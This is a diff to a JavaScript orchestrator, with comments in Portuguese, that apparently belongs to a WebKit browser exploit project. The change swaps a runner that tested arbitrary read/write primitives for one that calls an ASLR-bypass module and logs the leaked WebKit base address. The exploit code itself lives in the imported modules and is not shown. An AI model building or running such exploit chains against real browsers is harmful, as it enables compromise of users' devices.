@@ -1,46 +1,39 @@
-// js/script3/runAllAdvancedTestsS3.mjs (Revisão 47 - Adaptado para Novas Primitivas)
+// js/script3/runAllAdvancedTestsS3.mjs (Revisão Final - Orquestrador de Bypass)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
-import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
+import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 
-// ATUALIZADO: Importando a função de teste correta e o nome do módulo.
-import {
-    executeArrayBufferVictimCrashTest as executeExploit,
-    FNAME_MODULE_V28 as FNAME_MODULE
-} from './testArrayBufferVictimCrash.mjs';
+// Importa a nova função principal do nosso script de bypass consolidado
+import { run_all_aslr_bypasses } from './BypassASLR.mjs'; 
 
-async function runFinalExploitStrategy() {
-    const FNAME_RUNNER = "runFinalExploitStrategy";
-    logS3(`==== INICIANDO Estratégia de Teste (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+async function runFinalBypassStrategy() {
+    const FNAME_RUNNER = "runFinalBypassStrategy"; 
+    logS3(`==== INICIANDO ESTRATÉGIA DE BYPASS DE ASLR ====`, 'test', FNAME_RUNNER);
+    
+    // Chama a função que tentará todas as estratégias
+    const result = await run_all_aslr_bypasses();
 
-    // O teste agora retorna um objeto com uma estrutura diferente.
-    const result_wrapper = await executeExploit();
-    // O resultado real do teste está dentro da propriedade 'exploit_attempt_result'.
-    const result = result_wrapper?.exploit_attempt_result;
-
-    // ATUALIZADO: Lógica de verificação de sucesso adaptada para o novo formato de resultado.
-    if (!result || result.success === false) {
-        logS3(`  RUNNER: O teste das primitivas arb_read/write FALHOU.`, "critical", FNAME_RUNNER);
-        logS3(`  > Mensagem: ${result?.message || 'Erro desconhecido.'}`, "critical", FNAME_RUNNER);
-        document.title = `${FNAME_MODULE}: FAIL!`;
-    } else {
-        logS3(`  RUNNER: O teste das primitivas arb_read/write foi concluído com SUCESSO.`, "good", FNAME_RUNNER);
-        // O teste atual não vaza a base do WebKit, ele apenas confirma o R/W.
-        logS3(`  > Mensagem: ${result.message}`, "vuln", FNAME_RUNNER);
-        document.title = `SUCESSO! ${FNAME_MODULE}`;
-    }
-
-    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-    logS3(`==== Estratégia de Teste (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    if (!result || !result.success) {
+        logS3(`  RUNNER: TODAS AS ESTRATÉGIAS DE BYPASS FALHARAM.`, "critical", FNAME_RUNNER);
+        logS3(`  > Mensagem Final: ${result?.message || 'Erro desconhecido.'}`, "critical", FNAME_RUNNER);
+        document.title = `Exploit: ASLR Bypass FAIL!`;
+    } else {
+        logS3(`  RUNNER: BYPASS DE ASLR BEM-SUCEDIDO!`, "good", FNAME_RUNNER);
+        logS3(`  > Estratégia Vencedora: ${result.strategy}`, "good", FNAME_RUNNER);
+        logS3(`  > Base do WebKit Vazada: ${result.webkit_base}`, "vuln", FNAME_RUNNER);
+        document.title = `SUCESSO! Base: ${result.webkit_base}`;
+    }
+    
+    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`==== ESTRATÉGIA DE BYPASS DE ASLR CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
-    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
-    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = true;
-
-    await runFinalExploitStrategy();
-
-    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
-    if (runBtn) runBtn.disabled = false;
+    const FNAME_ORCHESTRATOR = `ASLR_Bypass_Orchestrator`;
+    logS3(`==== INICIANDO Script Final (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
+    
+    await runFinalBypassStrategy();
+    
+    logS3(`\n==== Script Final (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
+    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
 }
